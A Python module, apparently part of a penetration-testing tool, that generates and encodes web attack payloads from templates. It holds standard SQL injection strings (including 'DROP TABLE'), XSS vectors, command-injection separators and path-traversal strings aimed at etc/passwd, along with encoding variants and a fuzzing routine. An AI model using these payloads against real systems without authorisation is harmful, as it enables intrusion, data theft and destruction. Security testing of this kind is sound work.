"""
Payload Generator - Payload 生成器

根據漏洞類型和目標環境生成測試 Payload
"""



import base64
import logging
import urllib.parse
from typing import Any, Dict, List, Optional
from enum import Enum


logger = logging.getLogger(__name__)


class EncodingType(str, Enum):
    """編碼類型"""
    NONE = "none"
    URL = "url"
    BASE64 = "base64"
    HTML = "html"
    UNICODE = "unicode"
    DOUBLE_URL = "double_url"


class PayloadGenerator:
    """
    Payload 生成器
    
    根據漏洞類型和目標特徵生成定制化的測試 Payload
    """
    
    def __init__(self):
        """初始化 Payload 生成器"""
        self.generated_count = 0
        self.payload_templates = self._load_templates()
        
        logger.info("PayloadGenerator initialized")
    
    def _load_templates(self) -> Dict[str, List[str]]:
        """加載 Payload 模板"""
        return {
            "sql_injection": [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT {columns}--",
                "'; DROP TABLE {table}--",
                "' AND 1=CONVERT(int, @@version)--",
            ],
            "xss": [
                "<script>alert('{message}')</script>",
                "<img src=x onerror=alert('{message}')>",
                "<svg onload=alert('{message}')>",
                "<iframe src=javascript:alert('{message}')>",
            ],
            "command_injection": [
                "; {command}",
                "| {command}",
                "& {command}",
                "`{command}`",
                "$({command})",
            ],
            "path_traversal": [
                "../../../{file}",
                "..\\..\\..\\{file}",
                "....//....//....//",
                "{file}%00",
            ],
        }
    
    def generate(
        self,
        vuln_type: str,
        target_info: Dict[str, Any],
        encoding: EncodingType = EncodingType.NONE,
        custom_params: Optional[Dict[str, Any]] = None,
    ) -> List[str]:
        """
        生成 Payload
        
        Args:
            vuln_type: 漏洞類型
            target_info: 目標信息
            encoding: 編碼類型
            custom_params: 自定義參數
            
        Returns:
            生成的 Payload 列表
        """
        logger.debug(f"生成 Payload: type={vuln_type}, encoding={encoding}")
        
        # 獲取基礎模板
        templates = self.payload_templates.get(vuln_type, [])
        
        if not templates:
            logger.warning(f"未找到漏洞類型的模板: {vuln_type}")
            return []
        
        # 替換模板參數
        params = custom_params or {}
        params.setdefault('message', 'XSS')
        params.setdefault('command', 'whoami')
        params.setdefault('file', 'etc/passwd')
        params.setdefault('table', 'users')
        params.setdefault('columns', 'NULL,NULL,NULL')
        
        payloads = []
        for template in templates:
            try:
                payload = template.format(**params)
                
                # 應用編碼
                if encoding != EncodingType.NONE:
                    payload = self._encode_payload(payload, encoding)
                
                payloads.append(payload)
                
            except KeyError as e:
                logger.warning(f"模板參數缺失: {e}, template={template}")
                continue
        
        self.generated_count += len(payloads)
        
        logger.info(f"生成了 {len(payloads)} 個 {vuln_type} Payload")
        
        return payloads
    
    def _encode_payload(self, payload: str, encoding: EncodingType) -> str:
        """編碼 Payload"""
        
        if encoding == EncodingType.URL:
            return urllib.parse.quote(payload)
        
        elif encoding == EncodingType.BASE64:
            return base64.b64encode(payload.encode()).decode()
        
        elif encoding == EncodingType.HTML:
            return (
                payload
                .replace('&', '&amp;')
                .replace('<', '&lt;')
                .replace('>', '&gt;')
                .replace('"', '&quot;')
                .replace("'", '&#x27;')
            )
        
        elif encoding == EncodingType.UNICODE:
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        
        elif encoding == EncodingType.DOUBLE_URL:
            return urllib.parse.quote(urllib.parse.quote(payload))
        
        return payload
    
    def generate_fuzzing_payloads(
        self,
        base_payload: str,
        variations: int = 10,
    ) -> List[str]:
        """
        生成模糊測試 Payload
        
        Args:
            base_payload: 基礎 Payload
            variations: 變體數量
            
        Returns:
            Payload 變體列表
        """
        payloads = [base_payload]
        
        # 添加長度變化
        payloads.append(base_payload * 2)
        payloads.append(base_payload * 10)
        payloads.append(base_payload * 100)
        
        # 添加特殊字符
        special_chars = ['%', '#', '&', '?', '=', '+', ';', ':', '@']
        for char in special_chars[:min(variations, len(special_chars))]:
            payloads.append(base_payload + char)
            payloads.append(char + base_payload)
        
        return payloads[:variations]
    
    def get_statistics(self) -> Dict[str, Any]:
        """獲取統計信息"""
        return {
            "total_generated": self.generated_count,
            "available_templates": {
                vuln_type: len(templates)
                for vuln_type, templates in self.payload_templates.items()
            },
        }
